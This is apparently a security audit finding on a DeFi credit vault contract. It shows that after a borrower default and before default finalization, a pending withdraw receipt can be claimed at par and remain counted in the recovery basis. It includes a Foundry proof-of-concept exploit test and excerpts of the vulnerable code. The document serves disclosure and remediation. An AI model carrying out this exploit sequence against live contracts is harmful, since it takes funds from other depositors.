### Title
Pending withdraw receipts can spend recovery funds before default finalization - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
After borrower default but before `finalizeDefault`, a user with a current-epoch withdraw request can call `claimWithdrawRequest` and receive funds as if the request were already funded. The claim clears the user’s receipt but does not decrease `pendingWithdraws`, so the same claim is counted again during default-recovery finalization. This both pays the attacker once from pre-default strategy cash and dilutes the finalized recovery for other claimants.

### Finding Description
`claimWithdrawRequest` only enters the special default-recovery paths after `defaultRecoveryFinalized` is set. Before finalization, it falls through to `_claimLossAdjustedWithdrawRequest` and `_claimFundedWithdrawRequest`. [1](#0-0) 

`_claimFundedWithdrawRequest` gates only on `epochEndDate != 0` and `epochNumber <= lastWithdrawRequest[_user]`. When `_handleBorrowerDefault` closes the epoch state, `epochEndDate == 0`, so the maturity check is bypassed and the full recorded amount becomes claimable. [2](#0-1) 

The funded claim clears `withdrawsRequests[_user]` but never decrements `pendingWithdraws`. Therefore, the borrower-facing default claim basis still includes a receipt whose underlying was already paid. [3](#0-2) 

`_transferFundedClaim` protects only the value recorded in `defaultRecoveryReserve`. Before finalization, prefunded instant-withdraw or borrower-recovery cash held by the strategy may not yet be represented by that variable, so it can be spent by a normal pending-withdraw claim. [4](#0-3) 

During finalization, `defaultPendingClaimBasis` still includes the stale `pendingWithdraws`, and prefunded instant claims are also reconstructed from counters rather than from the strategy’s actual remaining cash. [5](#0-4) [6](#0-5) 

### Impact Explanation
A KYC-passing lender can receive up to `min(attackerPendingReceipt, strategyUnderlyingBalance)` early at par. The same receipt remains in `pendingWithdraws`, increasing `totalBasis` and lowering `defaultRecoveryPrice` for all defaulted claimants. Because the stolen cash is also included in the calculated recovery reserve through counter-based prefunding or recovery accounting, the strategy becomes short by the amount withdrawn. Later claimants either receive less than the intended recovery ratio or have their claims revert despite having valid receipts.

### Likelihood Explanation
The attacker only needs to have a pending withdraw request when an honest borrower default occurs and then claim before the manager calls `finalizeDefault`. Pending requests are ordinary lender actions, and the attack window exists between borrower failure and recovery finalization. Pre-default strategy cash can be supplied by funded instant-withdraw requests or funds returned to the strategy before the default is finalized.

### Recommendation
Before `defaultRecoveryFinalized`, `_claimFundedWithdrawRequest` should distinguish already-funded historical receipts from the current defaulted epoch. In particular:

- Do not allow `epochEndDate == 0` alone to bypass the one-epoch maturity check when `IIdleCDOEpochVariant(idleCDO).defaulted()` is true.
- Prevent claims against receipts belonging to the defaulted epoch until `finalizeDefault` assigns their recovery price.
- Alternatively, when paying a pre-finalization funded claim, remove its basis from `pendingWithdraws`, but only after proving that the receipt was funded before the default.
- Base prefunded recovery accounting on actual isolated balances or reserve counters updated at collection time, rather than reconstructing available cash from claim counters after users can withdraw it.

### Proof of Concept
This Foundry PoC is intended for the existing `IdleCreditVault.t.sol` fixture:

```solidity
function testPendingWithdrawSpendsDefaultRecoveryBeforeFinalization() external {
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    address attacker = makeAddr('default-window-attacker');
    address instantUser = makeAddr('instant-user');
    uint256 amount = 10_000 * ONE_SCALE;

    _depositWithUser(attacker, amount, true);
    _depositWithUser(instantUser, amount, true);

    // Attacker creates a normal pending receipt before the epoch starts.
    vm.prank(attacker);
    uint256 attackerReceipt = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // Lower the APR so the second user's request enters the instant-withdraw path.
    vm.prank(manager);
    creditVault.setAprs(0, 0);
    vm.prank(instantUser);
    uint256 instantReceipt = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // startEpoch transfers the instant-withdraw backing to IdleCreditVault.
    _startEpochAndCheckPrices(0);
    assertEq(underlying.balanceOf(address(creditVault)), instantReceipt);

    // Make the honest borrower unable to repay and stop the epoch. The CDO marks
    // the pool defaulted but recovery is not finalized yet.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    assertTrue(cdoEpoch.defaulted());
    assertFalse(creditVault.defaultRecoveryFinalized());

    uint256 attackerBalanceBefore = underlying.balanceOf(attacker);
    uint256 pendingBasisBefore = creditVault.pendingWithdraws();

    // The attacker can claim immediately even though the receipt was never funded.
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();

    assertEq(
        underlying.balanceOf(attacker) - attackerBalanceBefore,
        attackerReceipt,
        'unfunded pending receipt was paid at par'
    );
    assertEq(
        creditVault.pendingWithdraws(),
        pendingBasisBefore,
        'paid receipt remains in default claim basis'
    );
    assertEq(
        underlying.balanceOf(address(creditVault)),
        instantReceipt - attackerReceipt,
        'prefunded instant cash was consumed'
    );

    // Finalization still includes the attacker's already-paid pendingWithdraws basis.
    uint256 recovered = attackerReceipt / 2;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // The instant user whose cash funded the premature claim can no longer be paid.
    vm.prank(instantUser);
    vm.expectRevert();
    cdoEpoch.claimInstantWithdrawRequest();
}
```

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);

  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
